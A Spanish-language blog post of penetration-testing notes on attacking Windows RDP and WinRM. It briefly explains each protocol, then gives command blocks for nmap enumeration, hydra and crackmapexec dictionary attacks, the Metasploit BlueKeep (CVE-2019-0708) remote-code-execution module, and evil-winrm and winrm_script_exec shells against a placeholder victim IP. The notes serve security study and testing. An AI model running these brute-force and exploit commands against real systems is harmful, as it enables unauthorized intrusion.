---
title: 'Protocolos RDP y WinRM'
description: 'Notas sobre cómo explotarlos'
pubDate: 2024-01-25
author: 'Nicolas Riquelme'
tags: ["Hacking", "Windows", "RDP", "WinRM"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# Remote Desktop Protocol (RDP)
RDP es un protocolo de escritorio remoto que permite a los usuarios conectarse a un sistema remoto y controlarlo como si estuvieran sentados frente a él. Por defecto usa el puerto TCP 3389, pero es posible (y altamente recomendable) cambiarlo por otro. Este protocolo requiere autenticación mediante credenciales, pero puede ser vulnerado usando ataques de fuerza bruta.

## Enumeración
```ruby
nmap -sV -p- {ip víctima}

use auxiliary/scanner/rdp/rdp_scanner
	set rhosts {ip victima}
	set rport {puerto}			# en caso de que no use el puerto por defecto
	run 						# o exploit
```

## Ataque de diccionario
```ruby
hydra -L {ruta a diccionario} -P {ruta a diccionario} rdp://{ip victima} # si no usa el puerto por defecto, hay que añadir el parámetro "-s {puerto}"

xfreerdp /u:{usuario} /p:{password} /v:{ip víctima}:{puerto}
```

## Explotando BlueKeep (CVE-2019-0708)
```ruby
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
	set rhosts {ip victima}
	set rport {puerto}			# en caso de que no use el puerto por defecto
	run

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
	set rhosts {ip victima}
	set rport {puerto}			# en caso de que no use el puerto por defecto
	exploit
```
# Windows Remote Management (WinRM)
WinRM es un protocolo de administración remota que permite controlar y administrar sistemas Windows remotos. WinRM está basado en el protocolo WS-Management, que es un protocolo estándar abierto que permite la interoperabilidad entre sistemas de diferentes proveedores. Suele usar los puertos TCP 5985 (HTTP) y 5986 (HTTPS).

## Enumeración
```ruby
nmap -sV -p5985-5986 {ip víctima}
```

## Ataque de diccionario
```ruby
crackmapexec winrm {ip víctima} -u {usuario o diccionario} -p {password o diccionario} -x {comando} 		# a tener en cuenta que esta herramienta ha sido descontinuada y ahora se usa su reemplazo Netexec, que usa la misma sintaxis, excepto por el ejecutable, que se invoca con "nxc"
```

## Obtención de Shell
```ruby
evil-winrm.rb -u {usuario} -p '{password}' -i {ip víctima}

use exploit/windows/winrm/winrm_script_exec
	set rhosts {ip victima}
	set rport {puerto}			# en caso de que no use el puerto por defecto
	set force_vbs true
	set username {usuario}
	set password {password}
	exploit
	
```
